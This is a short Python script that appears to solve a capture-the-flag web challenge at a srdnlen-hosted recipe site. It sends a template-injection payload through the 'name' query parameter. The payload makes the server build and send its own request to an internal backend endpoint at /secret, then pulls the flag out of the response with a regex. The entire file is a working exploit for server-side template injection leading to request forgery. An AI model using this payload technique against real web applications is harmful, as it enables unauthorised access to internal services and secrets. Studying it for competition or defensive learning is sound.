import requests
import re

req = requests.session()

url = "http://sardiniandishes.challs.srdnlen.it"

payload= "@! res.request.prepare_url('http://backend:5000/secret','') !@ @! res.connection.send(res.request).text !@"
res = req.get(url+"/recipe?name="+payload)
res = res.text

flag = re.search("srdnlen{(.*)}", res).group(0)
print(flag)